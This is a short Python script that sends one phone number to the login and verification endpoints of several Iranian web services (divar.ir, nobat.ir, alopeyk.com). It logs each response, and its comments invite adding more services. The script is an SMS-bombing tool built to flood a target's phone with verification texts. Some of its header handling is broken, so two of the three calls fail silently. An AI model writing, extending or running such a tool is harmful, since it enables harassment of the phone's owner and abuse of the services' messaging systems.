import requests
import json
import random
import string
import time

def CURL_SMS(URL, PHONE_VALUE, HEADER1=None, HEADER2=None):
    response = None
    headers = {}
    if HEADER1:
        if HEADER2:
            headers = {HEADER1: HEADER2}
        else:
            headers = {HEADER1}
    try:
        response = requests.post(URL, data=PHONE_VALUE, headers=headers)
        response.raise_for_status()
        with open('log.txt', 'a') as log_file:
            log_file.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}]--URL={URL}{response.text}\n\n')
        time.sleep(2)
    except Exception as e:
        print(f"Error occurred: {e}")

def divar(phone):
    url = 'https://api.divar.ir/v5/auth/authenticate'
    phone_value = json.dumps({"phone": phone})
    CURL_SMS(url, phone_value)

def nobatir(phone):
    url = 'https://nobat.ir/api/public/patient/login/phone'
    phone_value = {"mobile": phone}
    headers = {'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY'}
    CURL_SMS(url, phone_value, headers)

def alopeyk_login(phone):
    phone = int(phone)
    url = 'https://api.alopeyk.com/api/v2/login?platform=pwa'
    phone_value = {
        "type": "CUSTOMER",
        "model": "Chrome 111.0.0.0",
        "platform": "pwa",
        "version": "10",
        "manufacturer": "Windows",
        "isVirtual": False,
        "serial": True,
        "app_version": "1.2.9",
        "uuid": True,
        "phone": phone
    }
    headers = {'content-type': 'application/json'}
    CURL_SMS(url, json.dumps(phone_value), headers)

# Define other functions for each service in a similar manner

def generate_random_string(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def main(phone):
    divar(phone)
    nobatir(phone)
    alopeyk_login(phone)
    # Call other functions here for other services

if __name__ == "__main__":
    phone_number = input("Enter your phone number: ")
    main(phone_number)
